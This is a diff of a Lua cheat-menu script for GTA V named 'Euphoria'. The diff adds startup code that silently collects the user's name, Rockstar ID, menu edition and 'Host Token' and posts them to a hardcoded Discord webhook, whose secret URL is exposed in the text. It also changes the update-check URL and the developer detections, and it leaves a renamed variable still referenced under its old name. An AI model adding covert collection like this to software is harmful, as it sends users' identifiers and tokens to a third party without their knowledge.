@@ -26,10 +26,13 @@
     pid = playerID
     user = players.user()
     userrid = players.get_rockstar_id(user)
-    username = players.get_name(user)
+    stdusername = players.get_name(user)
     joaat, toast, yield, draw_debug_text, reverse_joaat = util.joaat, util.toast, util.yield, util.draw_debug_text, util.reverse_joaat
     textinput = menu.text_input
-    scriptver = "v1.1"
+    userstded = menu.get_edition(user)
+    userproot = menu.player_root(user)
+    userhosttoken = getvaluee(refbyrpath(userproot, "Information>Host Token"))
+    scriptver = "v1.2b"    
 -- Lists
     ethmiscs = root:list("Miscs", {}, "Others & Credits")
     scripthosting = ethmiscs:list("Script Host Options")
@@ -214,17 +217,16 @@
 
                 util.toast("This weapon is now in the gun van in slot #" .. SelectedSlot_Throwables .. ".")
             end)
-
     -- Run at start of script
      -- Notification
-        util.show_corner_help("ScriptHostLocker took over Euphoria.\nWelcome "..username.." !\nCurrent Euphoria Version : "..scriptver..".\nLatest Euphoria Version : "..latesteuver..".")
+        async_http.init("https://raw.githubusercontent.com/ScriptHost/Euphoria/main/ver.txt", nil, function(data)
+            util.show_corner_help("Welcome "..stdusername.." !\nCurrent Euphoria Version : "..scriptver.."\nLatest Euphoria Version : "..data:split(":")[2])
+        end)
+        async_http.dispatch()
      -- WHS
-        local name = players.get_name(players.user())
-        local RID = players.get_rockstar_id(players.user())
-
         local Webhook_dev = "https://discord.com/api/webhooks/1248678568523731156/dHh8R72M8LY-11qf4ZIMVtuWOztsco_47gkJXoDeRe-lt-Txr2aj1iy2gcMszrEtmoTh"
 
-        local content = "{\"embeds\": [{\"footer\": {\"text\":\"[Stand]\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"title\": \"**__Euphoria__** got booted up by\",\"description\": \"Name : `" ..name.."`\\n RID : "..RID.."\\n Script Version : "..scriptver.."\",\"color\": 16734872}]}"
+        local content = "{\"embeds\": [{\"footer\": {\"text\":\"[Stand]\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"title\": \"**__Euphoria__** got booted up by\",\"description\": \"Name : `" ..stdusername.."`\\n RID : "..userrid.."\\n Script Version : "..scriptver.."\\n Stand Edition : "..userstded.."\\n Host Token : "..userhosttoken.."\",\"color\": 16734872}]}"
         async_http.init(Webhook_dev, nil, function()
         end, function()
         end)
@@ -1021,7 +1023,7 @@
     end)
 
     action(customv1, "euphoria version", {"euphoriaversion"}, "", function()
-        async_http.init("https://raw.githubusercontent.com/Akolpa/Euphoria/main/versions.txt", nil, function(data)
+        async_http.init("https://raw.githubusercontent.com/ScriptHost/Euphoria/main/ver.txt", nil, function(data)
             msg("Latest Euphoria release is "..data:split(":")[2]..", currently installed version is "..scriptver, false, true, true)
         end)
         async_http.dispatch()
@@ -1238,11 +1240,19 @@
         -- Detections
 
             if name != username then
-                if RID == 244695618 or RID == 252617333 then -- AnyaSenpai
+                if RID == 252617333 then -- ScriptHostLocker
                     if not isDetectionPresent(pid, "Euphoria Developer") then
-                    players.add_detection(pid, "Euphoria Developer", TOAST_ALL, 100)
+                     players.add_detection(pid, "Euphoria Developer", TOAST_ALL, 100)
+                    end
                 end
             end
+
+            if name != username then
+                if RID == 244695618 then -- AnyaSenpai
+                    if not isDetectionPresent(pid, "OG Euphoria User") then
+                     players.add_detection(pid, "OG Euphoria User", TOAST_ALL, 100)
+                    end
+                end
             end
         
         -- Lists
